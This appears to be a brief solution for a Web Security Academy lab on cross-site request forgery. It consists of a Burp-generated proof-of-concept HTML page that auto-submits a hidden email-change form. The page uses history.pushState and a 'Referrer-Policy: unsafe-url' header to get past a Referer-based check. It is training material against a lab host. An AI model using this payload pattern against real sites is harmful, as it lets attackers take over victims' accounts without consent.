```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab50009036dd06081942fbc001a00d5.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="wienie&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/exploit?https://0ab50009036dd06081942fbc001a00d5.web-security-academy.net/my-account/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

add the following to the header

```
Referrer-Policy: unsafe-url
```
